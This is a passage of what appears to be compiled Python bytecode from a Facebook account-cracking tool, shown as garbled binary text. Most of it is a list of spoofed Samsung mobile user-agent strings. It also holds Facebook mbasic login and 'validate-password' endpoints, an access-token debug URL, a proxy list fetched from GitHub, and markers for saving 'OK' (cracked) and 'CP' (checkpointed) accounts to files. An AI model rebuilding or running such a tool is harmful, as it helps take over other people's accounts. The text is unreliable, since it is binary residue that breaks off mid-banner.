Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36\xfa\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36\xfa\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36\xfa\x8aMozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36r\x18\x00\x00\x00r\x19\x00\x00\x00r\x1a\x00\x00\x00z\x81Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z\x81Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x96Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36z\x9aMozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8bMozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36z\x8cMozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x81Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36r\x17\x00\x00\x00z\x89Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x83Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z\x81Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x82Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z\x80Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z\x80Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z\x80Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x96Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x91Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x95Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x8aMozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x8bMozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x94Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x8cMozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z\x83Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36\xfa\x87Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36r\x1b\x00\x00\x00z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x88Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x89Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x95Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\x7fMozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z\xa0Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\xa0Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x9eMozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\xaeMozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\xa1Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x8fMozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z\x98Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x97Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x9aMozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x95Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36z\x94Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36z\x95Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa\xfa\xacMozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36r\x1c\x00\x00\x00z\x9fMozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\xaeMozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x90Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z\x90Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z\x99Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\xabMozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36z\xa8Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\xa6Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x98Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x91Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z\x98Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x9fMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x9fMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x9fMozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x9eMozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x9eMozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x9fMozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x99Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z\x07\x1b[1;93mz\x04\x1b[0mz\x07\x1b[1;92mz\x03\x1b[mz\x05\x1b[93mz\x05\x1b[32mz\x05\x1b[95mz\x05\x1b[33mz\x07\x1b[1;96mz\x07\x1b[0;34m\xfa\nuser-agentz\xccMozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]Z\x07JanuariZ\x08FebruariZ\x05MaretZ\x05AprilZ\x03MeiZ\x04JuniZ\x04JuliZ\x07AgustusZ\tSeptemberZ\x07OktoberZ\x08NovemberZ\x08Desember)\x0c\xda\x011\xda\x012\xda\x013\xda\x014\xda\x015\xda\x016\xda\x017\xda\x018\xda\x019\xda\x0210\xda\x0211\xda\x0212)\x0c\xda\x0201\xda\x0202\xda\x0203Z\x0204Z\x0205Z\x0206Z\x0207Z\x0208Z\x0209r\'\x00\x00\x00r(\x00\x00\x00r)\x00\x00\x00z\x16https://lookup-id.com/\xfa\x1bhttps://mbasic.facebook.comz\x1ahttps://www.httpbin.org/ipz\x1dhttps://graph.facebook.com/{})\x04z\nindex.php?z*next=https%3A%2F%2Fdevelopers.facebook.comz\x10%2Ftools%2Fdebugz\x11%2Faccesstoken%2F)\x04\xda\x05loginz\x0cdevice-basedz\x11validate-passwordz\x07?shbl=0)\x03Z\x05tools\xda\x05debugZ\x0baccesstokenzOhttps://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/Data/proxy2.txt\xfa\x1aen-GB,en-US;q=0.9,en;q=0.8zHMozilla/5.0 (X11; Fedora;Linux x86; rv:60.0) Gecko/20100101 Firefox/60.0z\x03OK-\xfa\x01-z\x04.txtz\x03CP-c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\x0e\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00d\x00S\x00)\x02N\xda\x05clear)\x02\xda\x02os\xda\x06system\xa9\x00r5\x00\x00\x00r5\x00\x00\x00\xda\x00r2\x00\x00\x00Q\x00\x00\x00s\x02\x00\x00\x00\x0e\x01r2\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\n\x00\x00\x00t\x00\x83\x00\x01\x00d\x00S\x00)\x01N)\x01r.\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00\xda\x04backT\x00\x00\x00s\x02\x00\x00\x00\n\x01r7\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00t\x00\x83\x00\x01\x00t\x01d\x01t\x02\x16\x00\x83\x01\x01\x00d\x00S\x00)\x02Nu\xc3\x05\x00\x00%s\n\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x90\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\n\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\n\xe2\x94\x80\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x94\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x90\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x